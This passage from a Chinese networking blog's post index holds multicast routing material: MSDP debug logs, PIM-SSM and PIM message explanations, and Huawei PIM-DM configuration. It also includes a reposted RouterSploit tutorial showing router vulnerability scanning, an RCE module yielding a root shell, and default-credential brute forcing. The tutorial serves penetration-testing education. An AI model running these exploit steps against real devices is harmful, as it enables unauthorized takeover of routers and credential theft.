3-byte TCPsegment from 192.168.34.3 *Mar 1 00:01:40.183: MSDP(0): Append 3 bytes to0-byte msg 1 from 192.168.34.3, qs 1 *Mar 1 00:02:25.027: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:02:25.031: MSDP(0): Append 3 bytes to0-byte msg 2 from 5.5.5.5, qs 1 *Mar 1 00:02:29.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:29.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:38.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:38.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:40.183: MSDP(0): Received 3-byte TCPsegment from 192.168.34.3 *Mar 1 00:02:40.183: MSDP(0): Append 3 bytes to0-byte msg 3 from 192.168.34.3, qs 1 *Mar 1 00:03:13.379: MSDP(0): Received 120-byteTCP segment from 192.168.34.3 *Mar 1 00:03:13.379: MSDP(0): Append 120 bytes to0-byte msg 4 from 192.168.34.3, qs 1 *Mar 1 00:03:24.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:24.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:25.015: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:03:25.015: MSDP(0): Append 3 bytes to0-byte msg 5 from 5.5.5.5, qs 1 *Mar 1 00:03:30.887: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:30.887: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:32.159: MSDP(0): Received 20-byte TCPsegment from 192.168.34.3 *Mar 1 00:03:32.163: MSDP(0): Append 20 bytes to0-byte msg 6 from 192.168.34.3, qs 1 *Mar 1 00:04:20.895: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:25.027: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:04:25.031: MSDP(0): Append 3 bytes to0-byte msg 7 from 5.5.5.5, qs 1 *Mar 1 00:04:25.899: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:25.899: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:29.183: MSDP(0): Received 20-byte TCPsegment from 192.168.34.3 *Mar 1 00:04:29.187: MSDP(0): Append 20 bytes to0-byte msg 8 from 192.168.34.3, qs 1 R4#debugip msdp de MSDPDetail debugging is on *Mar 1 00:00:33.651: %PIM-5-NBRCHG: neighbor192.168.34.3 UP on interface Ethernet0/0 *Mar 1 00:00:35.487: %BGP-5-ADJCHANGE: neighbor192.168.34.3 Up *Mar 1 00:00:39.235: %MSDP-5-PEER_UPDOWN: Sessionto peer 192.168.34.3 going up *Mar 1 00:00:40.175: MSDP(0): Received 3-byte TCPsegment from 192.168.34.3 *Mar 1 00:00:40.175: MSDP(0): Append 3 bytes to0-byte msg 0 from 192.168.34.3, qs 1 *Mar 1 00:00:40.871: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:00:40.871: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:24.255: %PIM-5-NBRCHG: neighbor192.168.45.5 UP on interface Ethernet0/1 *Mar 1 00:01:24.271: %PIM-5-DRCHG: DR change fromneighbor 192.168.45.4 to 192.168.45.5 on interface Ethernet0/1 *Mar 1 00:01:25.887: %DUAL-5-NBRCHANGE: IP-EIGRP(0)1: Neighbor 192.168.45.5 (Ethernet0/1) is up: new adjacency *Mar 1 00:01:34.947: %MSDP-5-PEER_UPDOWN: Sessionto peer 5.5.5.5 going up *Mar 1 00:01:36.879: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:36.879: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:38.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:38.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:39.251: %BGP-5-ADJCHANGE: neighbor 5.5.5.5Up *Mar 1 00:01:40.183: MSDP(0): Received 3-byte TCPsegment from 192.168.34.3 *Mar 1 00:01:40.183: MSDP(0): Append 3 bytes to0-byte msg 1 from 192.168.34.3, qs 1 *Mar 1 00:02:25.027: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:02:25.031: MSDP(0): Append 3 bytes to0-byte msg 2 from 5.5.5.5, qs 1 *Mar 1 00:02:29.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:29.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:38.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:38.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:02:40.183: MSDP(0): Received 3-byte TCPsegment from 192.168.34.3 *Mar 1 00:02:40.183: MSDP(0): Append 3 bytes to0-byte msg 3 from 192.168.34.3, qs 1 *Mar 1 00:03:13.379: MSDP(0): Received 120-byteTCP segment from 192.168.34.3 *Mar 1 00:03:13.379: MSDP(0): Append 120 bytes to0-byte msg 4 from 192.168.34.3, qs 1 *Mar 1 00:03:24.883: MSDP(0): start_index = 0, sa_cache_index= 0, Qlen = 0 *Mar 1 00:03:24.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:25.015: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:03:25.015: MSDP(0): Append 3 bytes to0-byte msg 5 from 5.5.5.5, qs 1 *Mar 1 00:03:30.887: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:30.887: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:32.159: MSDP(0): Received 20-byte TCPsegment from 192.168.34.3 *Mar 1 00:03:32.163: MSDP(0): Append 20 bytes to0-byte msg 6 from 192.168.34.3, qs 1 *Mar 1 00:04:20.895: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:20.895: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:25.027: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:04:25.031: MSDP(0): Append 3 bytes to0-byte msg 7 from 5.5.5.5, qs 1 *Mar 1 00:04:25.899: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:25.899: MSDP(0): Sent entire sa-cache,sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:29.183: MSDP(0): Received 20-byte TCPsegment from 192.168.34.3 *Mar 1 00:04:29.187: MSDP(0): Append 20 bytes to0-byte msg 8 from 192.168.34.3, qs 1 *Mar 1 00:05:20.903: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:05:20.903: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:05:23.903: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:05:23.903: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:05:24.999: MSDP(0): Received 3-byte TCPsegment from 5.5.5.5 *Mar 1 00:05:25.003: MSDP(0): Append 3 bytes to0-byte msg 9 from 5.5.5.5, qs 1 *Mar 1 00:05:28.207: MSDP(0): Received 20-byte TCPsegment from 192.168.34.3 *Mar 1 00:05:28.207: MSDP(0): Append 20 bytes to0-byte msg 10 from 192.168.34.3, qs 1 查看R3和R4的多播路由表 R3#sh ip mroute IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:07:34/00:02:46, RP 10.10.10.10, flags: S Incoming interface: Ethernet0/0, RPF nbr192.168.23.2 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:07:34/00:02:46 (192.168.1.2,224.1.1.1), 00:06:45/00:00:09, flags: T Incoming interface: Ethernet0/0, RPF nbr192.168.23.2 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:06:45/00:02:46 (*, 224.0.1.40), 00:12:22/00:02:37, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Loopback0, Forward/Sparse, 00:12:22/00:02:37 R4#sh ip mroute IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:08:08/00:03:15, RP 10.10.10.10, flags: S Incoming interface: Ethernet0/0, RPF nbr192.168.34.3 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:08:08/00:03:15 (*, 224.0.1.40), 00:10:28/00:02:35, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Loopback0, Forward/Sparse, 00:10:28/00:02:35","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"PIM-SSM简介","slug":"EMBEDDED/PIM-SSM简介","date":"2016-05-10T04:01:35.000Z","updated":"2017-07-10T08:51:08.115Z","comments":true,"path":"EMBEDDED/PIM-SSM简介.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/PIM-SSM简介.html","excerpt":"源特定组播(SSM：Source Specific Multicast)是一种区别于传统组播的新的业务模型，它使用组播组地址和组播源地址同时来标识一个组播会话，而不是向传统的组播服务那样只使用组播组地址来标识一个组播会话。SSM保留了传统PIM-SM模式中","text":"源特定组播(SSM：Source Specific Multicast)是一种区别于传统组播的新的业务模型，它使用组播组地址和组播源地址同时来标识一个组播会话，而不是向传统的组播服务那样只使用组播组地址来标识一个组播会话。SSM保留了传统PIM-SM模式中的主机显示加入组播组的高效性，但是跳过了PIM-SM模式中的共享树和RP(Rendezvous Point，集合点)规程。在传统PIM-SM模式中，共享树和RP规程使用(，G)组对来表示一个组播会话，其中(G)表示一个特定的IP组播组，而()表示发向组播组G的任何一个源。SSM直接建立由(S,G)标识的一个组播最短路径树(SPT：Shortest Path Tree)，其中(G)表示一个特定的IP组播组地址，而(S)表示发向组播组G的特定源的IP地址。SSM 的一个(S,G)对也被称为一个频道(Channel)，以区分传统PIM-SM组播中的任意源组播组(ASM：Any Source Multicast). 因此,SSM特别适合于点到多点的组播服务，例如网络娱乐频道、网络新闻频道、网络体育频道等业务，但如果要求多点到多点组播服务则需要ASM模式。 PIM-SSM是对传统PIM协议的扩展，使用SSM，用户能直接从组播源接收组播业务量，PIM－SSM利用PIM-SM的功能，在组播源和客户端之间，产生一个SPT树。但PIM-SSM在产生SPT树时，不需要汇聚点(RP)的帮助。 一个具有SSM功能的网络相对于传统的PIM-SM网路来说，具有非常突出的优越性。网络中不再需要汇聚点，也不再需要共享树或RP的映射，同时网络中也不再需要MSDP协议，以完成RP与RP之间的源发现。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"路由器漏洞检测及利用框架 RouterSploit","slug":"EMBEDDED/路由器漏洞检测及利用框架 RouterSploit","date":"2016-05-09T14:28:45.000Z","updated":"2017-07-10T08:47:45.794Z","comments":true,"path":"EMBEDDED/路由器漏洞检测及利用框架 RouterSploit.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/路由器漏洞检测及利用框架 RouterSploit.html","excerpt":"RouteSploit框架是一款开源的漏洞检测及利用框架，其针对的对象主要为路由器等嵌入式设备。 asciicast 框架功能 RouteSploit框架主要由可用于渗透测试的多个功能模块组件组成， 1、 Scanners：模块功能主要为检查目标设","text":"RouteSploit框架是一款开源的漏洞检测及利用框架，其针对的对象主要为路由器等嵌入式设备。 asciicast 框架功能 RouteSploit框架主要由可用于渗透测试的多个功能模块组件组成， 1、 Scanners：模块功能主要为检查目标设备是否存在可利用的安全漏洞； 2、Creds：模块功能主要针对网络服务的登录认证口令进行检测； 3、Exploits：模块功能主要为识别到目标设备安全漏洞之后，对漏洞进行利用，实现提权等目的。 工具安装 sudo apt-get install python-requests python-paramiko python-netsnmpgit clone https://github.com/reverse-shell/routersploit ./rsf.pyGitHub地址如上命令中所述为：RouteSploit。 操作使用 首先，启动RouteSploit框架，具体如下所示 root@kalidev:~/git/routersploit# ./rsf.py | \\ | | / | | | () | | |/ / | | _ __\\ `–. | | _ | | | // | | | | __/ \\ ‘|`–. \\ ‘ | |/ | | | | |\\ \\ () | || | || / | /\\/ / |) | | () | | | \\| __/ \\,|____|| __/| ./||_/|_|\\| | | Router Exploitation Framework |_| Dev Team : Marcin Bury (lucyoa) &amp; Mariusz Kupidura (fwkz) Codename : Wildest Dreams version : 1.0.0 rsf &gt;1、Scanners 模块 scanners模块，具备设备漏洞扫描功能，通过该模块，可快速识别目标设备是否存在可利用的安全漏洞，下面会以一个dlink路由器为例，结合进行操作描述。 （1）选择scanners模块，操作如下， rsf &gt; use scanners/dlink_scanrsf (D-Link Scanner) &gt; show options（2）显示选项 Target options: Name Current settings Description target Target address e.g. http://192.168.1.1 port 80 Target port（3）设置目标设备IP rsf (D-Link Scanner) &gt; set target 192.168.1.1[+] {‘target’: ‘192.168.1.1’}（4）运行模块，执行情况如下， rsf (D-Link Scanner) &gt; run[+] exploits/dlink/dwr_932_info_disclosure is vulnerable[-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable[-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable[-] exploits/dlink/dns_320l_327l_rce is not vulnerable[-] exploits/dlink/dir_645_password_disclosure is not vulnerable[-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable[-] exploits/dlink/dir_300_600_rce is not vulnerable [+] Device is vulnerable! exploits/dlink/dwr_932_info_disclosure如上所呈现的结果，目标设备存在dwr_932_info_disclosure漏洞。接下来，我们选择合适的payload进行传递和测试（以下涉及exploits模块功能操作，如需，请再往下查阅）， 6.png 2、Exploits 模块 （1）选择Exploits模块，操作如下， rsf &gt; use exploits/exploits/2wire/ exploits/asmax/ exploits/asus/ exploits/cisco/ exploits/dlink/ exploits/fortinet/ exploits/juniper/ exploits/linksys/ exploits/multi/ exploits/netgear/rsf &gt; use exploits/dlink/dir_300_600_rcersf (D-LINK DIR-300 &amp; DIR-600 RCE) &gt;我们也可以使用“tab”键来自动补充输入命令。 （2）显示选项 rsf (D-LINK DIR-300 &amp; DIR-600 RCE) &gt; show options Target options: Name Current settings Description target Target address e.g. http://192.168.1.1 port 80 Target Port设置选项，操作如下， rsf (D-LINK DIR-300 &amp; DIR-600 RCE) &gt; set target http://192.168.1.1[+] {‘target’: ‘http://192.168.1.1&#39;}（3）运行模块 通过使用“run”或“exploit”命令来完成漏洞的利用， rsf (D-LINK DIR-300 &amp; DIR-600 RCE) &gt; run[+] Target is vulnerable[*] Invoking command loop…cmd &gt; whoamiroot也可检测目标设备是否存在选定的安全漏洞，操作如下， rsf (D-LINK DIR-300 &amp; DIR-600 RCE) &gt; check[+] Target is vulnerable（4）显示具体漏洞信息 通过“show info”命令，显示漏洞信息，包括其存在的设备品牌、型号、漏洞类型及参考来源，具体参考如下， rsf (D-LINK DIR-300 &amp; DIR-600 RCE) &gt; show info Name:D-LINK DIR-300 &amp; DIR-600 RCE Description:Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges. Targets: D-Link DIR 300 D-Link DIR 600 Authors: Michael Messner # vulnerability discovery Marcin Bury # routersploit module References: http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router http://www.s3cur1ty.de/home-Network-horror-days http://www.s3cur1ty.de/m1adv2013-0033、 Creds模块 （1）选择模块 此模块相关文件位于 /routesploit/modules/creds/ 目录下，以下为该模块支持检测的服务， ? ftp ? ssh ? telnet ? http basic auth ? http form auth ? snmp 在检测过程中，可通过两个层面对上述的每个服务进行检测， 默认服务登录口令检测：利用框架提供的各类路由等设备以及服务的默认登录口令字典，通过快速列举的方式，可在较短时间内（几秒钟）验证设备是否仍使用默认登录口令； 暴力破解：利用框架中所提供的特定账户或者账户列表进行字典攻击。其中包含两个参数（登录账户及密码），如框架/routesploit/wordlists目录中字典所示，参数值可以为一个单词（如’admin’），或者是一整个单词列表。 （2）控制台 rsf &gt; use creds/creds/ftp_bruteforce creds/http_basic_bruteforce creds/http_form_bruteforce creds/snmp_bruteforce creds/ssh_default creds/telnet_defaultcreds/ftp_default creds/http_basic_default creds/http_form_default creds/ssh_bruteforce creds/telnet_bruteforcersf &gt; use creds/ssh_defaultrsf (SSH Default Creds) &gt;（3）显示选项 5.png （4）设置目标设备IP rsf (SSH Default Creds) &gt; set target 192.168.1.53[+] {‘target’: ‘192.168.1.53’}（5）运行模块 rsf (SSH Default Creds) &gt; run[] Running module…[] worker-0 process is starting…[] worker-1 process is starting…[] worker-2 process is starting…[] worker-3 process is starting…[] worker-4 process is starting…[] worker-5 process is starting…[] worker-6 process is starting…[*] worker-7 process is starting…[-] worker-4 Authentication failed. Username: ‘3comcso’ Password: ‘RIP000’[-] worker-1 Authentication failed. Username: ‘1234’ Password: ‘1234’[-] worker-0 Authentication failed. Username: ‘1111’ Password: ‘1111’[-] worker-7 Authentication failed. Username: ‘ADVMAIL’ Password: ‘HP’[-] worker-3 Authentication failed. Username: ‘266344’ Password: ‘266344’[-] worker-2 Authentication failed. Username: ‘1502’ Password: ‘1502’ (..) Elapsed time: 38.9181981087 seconds[+] Credentials found! Login Password admin 1234 rsf (SSH Default Creds) &gt;介绍内容来自 FreeBuf黑客与极客","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"PIM协议报文种类及功能","slug":"EMBEDDED/PIM协议报文种类及功能 (2)","date":"2016-05-09T08:02:19.000Z","updated":"2017-07-10T08:51:01.575Z","comments":true,"path":"EMBEDDED/PIM协议报文种类及功能 (2).html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/PIM协议报文种类及功能 (2).html","excerpt":"PIM是 Protocol Independent Multicast（协议无关组播）的简称，表示可以利用静 态路由或者任意单播路由协议（包括 RIP、OSPF、IS-IS、BGP等）所生成的单播 路由表为 IP组播提供路由。 目前常用PIM为版本号2","text":"PIM是 Protocol Independent Multicast（协议无关组播）的简称，表示可以利用静态路由或者任意单播路由协议（包括 RIP、OSPF、IS-IS、BGP等）所生成的单播路由表为 IP组播提供路由。 目前常用PIM为版本号2为版本。 PIM的类型字段分别为0-8代表9种PIM报文类型。 类型： 0：Hello报文 用于建立邻居，并选择DR。 1：Register报文 （单播） ：组播源发送组播数据时，DR与RP之间，进行注册，形成S，G表项。 2：Register Stop报文 （单播） ：RP向DR发送注册停止报文。 3：Join/Prune报文 加入报文：组播组成员发送Report报文后，DR与RP之间，*，G表项的形成 剪枝报文：PIM-DM模式下，当组播路由器下没有相应的接收者，则组播路由会发出剪枝报文，清除S，G 表项。 PIM-SM模式下，当组播路由器下有组播组的成员要离开组播组时，会向外发送Leave报文，到达DR后，由DR向RP发送剪枝报文，以清除相应的组播路由表项。 4：Bootstrap报文 ：由BSR发出，两个作用：第一：用于C-BSR之间选举BSR。第二：汇总C-RP发出的通告报文，选举RP。 5：Assert报文 ：当一个组播组接收者直连的组播路由器（DR）与上游两台组播路由器相连，并且，两台组播路由器发出相同的组播数据时，两台组播路由器会向所有的PIM路由器发出断言报文，并且从这两台组播路由器中选举出一台组播数据的转发者。 6：Graft报文 :嫁接报文，用于PIM-DM模式下，针对剪枝报文，当组播路由器下，有组播数据的接收者时，组播路由器会向上行路由器发送嫁接报文，以便重新的形成SG表项。 7：Graft Reply报文 ：嫁接回应报文，用于PIM-DM模式下，当上游组播路由器收到嫁接报文时，会回应一个嫁接回应报文，来确认嫁接的过程，如果组播路由发送的嫁接报文没有得到回应，则会一直发送嫁接报文。 8：C-RP Advertisement报文 （单播） ：C-RP通告报文，所有的C-RP向BSR发送通告报文，其中包括优先级和IP地址信息，以单播的形式发送，由BSR选举出RP。 PIM中如果把加入和剪枝报文分开的话，正好有十种消息，其中Hello报文，加入，剪枝报文，断言报文是DM和SM都要使用的报文 三种类型为 1 2 8 的单播报文为PIM-SM协议专用。其它信息是按多播方式发送，目的地址为224.0.0.13","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"组播PIM-DM配置教程","slug":"EMBEDDED/组播PIM-DM配置教程","date":"2016-05-09T07:52:06.000Z","updated":"2017-07-10T08:47:11.337Z","comments":true,"path":"EMBEDDED/组播PIM-DM配置教程.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/组播PIM-DM配置教程.html","excerpt":"PIM-DM理论知识：http://www.023wg.com/Multicast/216.html PIM-DM网络的所有设备使能了PIM-DM后，就可为用户主机提供任意源组播服务，加入同一组播组的用户主机都能收到任意源发往该组的组播数据。配置PIM-","text":"PIM-DM理论知识：http://www.023wg.com/Multicast/216.html PIM-DM网络的所有设备使能了PIM-DM后，就可为用户主机提供任意源组播服务，加入同一组播组的用户主机都能收到任意源发往该组的组播数据。配置PIM-DM前需先配置单播路由协议，保证网络内单播路由畅通。VPN实例或者公网实例上不能同时使能PIM-DM和PIM-SM。建议将处于PIM-DM网络内的所有接口都使能PIM-DM，以确保与其相连的PIM设备都能建立邻居关系。 如果接口上需要同时使能PIM-DM和IGMP，必须要先使能PIM-DM，再使能IGMP。 1、公网实例的PIM-DM配置 1.1、设置组播转发模式为大规格模式（可选） [Huawei]set multicast forwarding-table super-mode 此功能需要重启设备才能生效。配置此功能后，PIM-DM的状态刷新报文发送间隔由60s变为255s。配置此功能后，PIM-DM的Join/Prune报文保持时间由210s变为300s1.2、优化接口板上组播报文的复制能力 [Huawei]assign multicast-ressource-mode optimize 1.3、使能组播路由功能 [Huawei]multicast routing-enable 1.4、使能PIM-DM [Huawei-GigabitEthernet0/0/1]pim dm 2、VPN实例的PIM-DM配置 [Huawei]ip vpn-instance 1 [Huawei-vpn-instance-1] [Huawei-vpn-instance-1]multicast routing-enable [Huawei-GigabitEthernet0/0/2]ip binding vpn-instance 1 # 将接口与VPN实例进行关联 [Huawei-GigabitEthernet0/0/2]pim dm 3、PIM-DM组播源控制参数设置 通过ACL对组播源的地址进行过滤，以及对组播源生存时间进行控制，可以提高数据安全性、控制网络流量。 当PIM设备在接收到源S发往组播组G的组播报文后，就会启动该（S，G）表项的定时器，时间设为源生存时间。如果超时前接收到源S后续发来的报文，则重置定时器；如果超时后没有接收到源S后续发来的报文，则认为（S，G）表项失效，将其删除。 如果希望控制组播流量或者保证接收数据的安全性，还可在PIM设备上配置源地址过滤策略，只接收该策略允许范围内组播源发送的组播数据。 3.1、组播源生存时间 [Huawei-pim]source-lifetime ? INTEGER&lt;60-65535&gt; Specify source lifetime in seconds 3.2、源地址过滤策略 [Huawei-pim]source-policy ? INTEGER&lt;2000-3999&gt; Apply basic or advanced ACL acl-name Name ACL 如果指定ACL没有配置过滤规则，则不转发任何源地址发送的组播报文。执行本功能不过滤静态（S，G）和记录了私网加入信息的PIM表项。4、PIM-DM Hello报文的时间控制参数设置 PIM设备通过周期性地发送Hello报文来维护PIM邻居关系。当PIM设备收到邻居发来Hello报文后，会启动定时器，时间设为该Hello报文的保持时间。 如果超时后没有收到邻居发来的Hello报文，则认为该邻居失效或者不可达。因此，PIM设备发送Hello报文的时间间隔必须要小于Hello报文的保持时间。 为了避免多个PIM设备同时发送Hello报文而导致冲突，当PIM设备接收到Hello报文时，将延迟一段时间再发送Hello报文。该段时间的值为一个随机值，并且小于触发Hello报文的最大延迟。 发送Hello报文的时间间隔、Hello报文的保持时间在全局PIM视图下和接口视图下都可配置。如果同时配置，接口视图上的配置生效。 触发Hello报文的最大延迟时间只能在接口上配置。 4.1、发送Hello报文的时间间隔 [Huawei-pim]timer hello ? INTEGER&lt;1-2147483647&gt; Timer interval in seconds 或 [Huawei-GigabitEthernet0/0/1]pim timer hello ? INTEGER&lt;1-2147483647&gt; Timer interval in seconds 4.2、Hello报文的保持时间 [Huawei-pim]hello-option holdtime ? INTEGER&lt;1-65535&gt; Holdtime in seconds 或 [Huawei-GigabitEthernet0/0/1]pim hello-option holdtime ? INTEGER&lt;1-65535&gt; Holdtime in seconds 4.3、设置触发Hello报文的最大延迟 [Huawei-GigabitEthernet0/0/1]pim triggered-hello-delay ? INTEGER&lt;1-5&gt; Specify triggered hello delay interval in seconds 5、PIM-DM邻居过滤策略设置 设备支持不同的邻居过滤策略，来保证PIM-DM网络的安全和畅通： 限定合法的邻居地址范围，防止非法邻居入侵等。拒绝接收无Generation ID的Hello报文，保证设备相连的都是正常工作的PIM邻居。 5.1、配置合法的邻居地址范围 [Huawei-GigabitEthernet0/0/1]pim neighbor-policy ? INTEGER&lt;2000-2999&gt; Apply basic ACL acl-name Name ACL 设备上配置了合法的邻居地址范围后，如果之前与其建立好邻居关系的PIM设备不在其合法地址范围内，后续将不会再收到邻居设备的Hello报文。邻居关系也会因Hello报文的保持时间超时而解除。在定义ACL的rule时，通过permit参数配置接口仅接收指定地址范围的Hello报文。如果ACL未定义rule，则接口过滤掉所有地址范围的Hello报文。 5.2、只接收包含Generation ID的Hello报文 [Huawei-GigabitEthernet0/0/1]pim require-genid 6、PIM-DM Join/Prune报文的保持时间 PIM设备通过向上游发送Prune（剪枝）信息请求停止转发组播数据。实际上，Prune信息被封装在了PIM协议通用的转发控制报文（即Join/Prune报文）中。 上游设备在收到Join/Prune报文后，就会启动定时器，时间设为Join/Prune报文自身携带的保持时间。超时后，如果没有收到下游后续发来的Join/Prune报文，则恢复相应组播组下游接口的转发。 Join/Prune报文的保持时间在全局PIM视图下和接口视图下都可配置，如果同时配置，接口视图上的配置生效。 [Huawei-pim]holdtime join-prune ? INTEGER&lt;1-65535&gt; Join/prune holdtime in seconds 或 [Huawei-GigabitEthernet0/0/1]pim holdtime join-prune ? INTEGER&lt;1-65535&gt; Join/prune holdtime in seconds 7、PIM-DM Join/Prune报文信息携带能力 在PIM-DM网络中，Join/Prune报文主要包含了需要剪枝的表项信息。设备支持通过配置Join/Prune报文长度、包含表项数目、发送方式，来调整向上游发送剪枝信息的信息量： 当PIM邻居设备性能比较差，处理单个Join/Prune报文耗时比较长，可以通过调整发送的Join/Prune报文长度来控制发送Join/Prune报文携带的(S, G)表项数量，来降低PIM邻居设备的压力。 当PIM邻居设备Join/Prune报文处理吞吐量比较小时，可以通过调整周期性报文发送队列长度，控制每次发给PIM邻居设备的(S, G)表项数量，采取小量多批次方式发送Join/Prune报文，从而避免PIM邻居设备来不及处理就将报文丢弃，引起路由振荡。 缺省情况下，为了提高发送效率，Join/Prune报文都是打包向上游发送。如果不希望Join/Prune报文打包发送，可去使能此功能。 7.1、设备发送的Join/Prune报文的最大长度 [Huawei-pim]join-prune max-packet-length ? INTEGER&lt;100-8100&gt; Specify maximum join/prune packet length in bytes, the default is 8100 bytes 7.2、设备每秒发送Join/Prune报文中包含的表项数目。 [Huawei-pim]join-prune periodic-messages queue-size ? INTEGER&lt;16-4096&gt; Specify maximum join/prune entries sent once 7.3、关闭实时触发的Join/Prune报文打包功能 [Huawei-pim]join-prune triggered-message-pack disable 8、PIM-DM剪枝延迟时间设置 在剪枝过程中，从收到下游设备发来的剪枝信息到继续向上游设备发送剪枝信息会有延迟时间，这段时间称为LAN-Delay。 PIM设备在向上游发完剪枝信息后，也不会立即将相应下游接口剪掉，还会保持一段时间向下游转发。如果下游又有组播需求，必须要在这段时间内发送加入请求以否决这个剪枝动作。 这段否决剪枝的时间称为Override-Interval。 所以，实际上PIM设备从收到剪枝信息到完成剪枝动作总共延迟了LAN-Delay＋Override-Interval段时间。 LAN-Delay、Override-Interval在全局PIM视图下和接口视图下都可配置，如果同时配置，接口视图下的配置优先级高于系统视图下的配置，接口视图下的配置生效。 8.1、发送剪枝报文的延迟时间 [Huawei-pim]hello-option lan-delay ? INTEGER&lt;1-32767&gt; Lan delay in milliseconds 或 [Huawei-GigabitEthernet0/0/1]pim hello-option lan-delay ? INTEGER&lt;1-32767&gt; Lan delay in milliseconds 8.2、否决剪枝的时间 